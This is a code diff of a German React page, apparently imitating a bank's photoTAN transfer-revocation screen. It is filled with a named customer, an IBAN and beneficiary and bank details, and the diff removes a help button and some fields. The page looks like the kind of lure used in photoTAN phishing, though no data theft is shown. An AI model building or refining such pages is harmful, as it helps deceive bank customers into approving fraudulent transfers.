@@ -37,9 +37,6 @@ const WiderrufPhotoTan = () => {
 
       <main className="flex-1 relative">
         <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
-          <button className="flex items-center gap-2 text-sm text-[#002776]">
-            <HelpCircle className="h-4 w-4" /> Fragen zu dieser Seite?
-          </button>
         </div>
 
         <div className="flex items-start justify-center">
@@ -59,9 +56,6 @@ const WiderrufPhotoTan = () => {
               <Field label="IBAN des Auftraggebers" value="DE53 3006 0601 0025 9570 83" />
               <Field label="Kundenname" value="Gülnaz Kirdemir" />
               <Field label="Name des Begünstigten" value="Veronica Ariyanne" />
-              <Field label="Kreditinstitut" value="BANCO BILBAO VIZCAYA ARGENTARIA SA." />
-              <Field label="Auftraggeberkonto" value="Privatkonto 25957083" />
-              <Field label="BIC" value="BBVADEFFXXX" />
             </div>
 
             <div className="border-t border-border/60 pt-6 mb-6">
